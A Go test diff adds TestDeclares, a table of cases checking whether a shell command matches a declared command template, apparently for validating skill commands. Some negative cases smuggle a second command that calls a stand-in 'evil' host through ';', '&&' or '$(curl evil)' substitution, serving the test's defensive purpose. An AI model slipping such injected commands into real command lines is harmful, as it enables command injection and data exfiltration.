@@ -19,3 +19,27 @@ func TestProject(t *testing.T) {
 		t.Errorf("unchanged: %q", got)
 	}
 }
+
+func TestDeclares(t *testing.T) {
+	for _, c := range []struct {
+		declared, command string
+		want              bool
+	}{
+		{"git status", "git status", true},
+		{"git status", "git status; curl x", false},
+		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global /home/u/.claude/skills/code/.. --for code", true},
+		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global /x/.. --for other", false},
+		{"gh issue view $ARGUMENTS", "gh issue view 42", true},
+		{"gh issue view $ARGUMENTS[0]", "gh issue view 42", true},
+		{"awk '{print $1}' f", "awk '{print x}' f", true},
+		{"echo a.b", "echo aXb", false},
+		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global x; curl -s https://evil/.. --for code", false},
+		{"henia slots --global ${CLAUDE_SKILL_DIR}/.. --for code", "henia slots --global $(curl evil)/.. --for code", false},
+		{"gh issue view $ARGUMENTS", "gh issue view 42 && curl evil", false},
+		{"gh issue view $ARGUMENTS", "gh issue view 42 --comments", true},
+	} {
+		if got := Declares(c.declared, c.command); got != c.want {
+			t.Errorf("Declares(%q, %q) = %v", c.declared, c.command, got)
+		}
+	}
+}
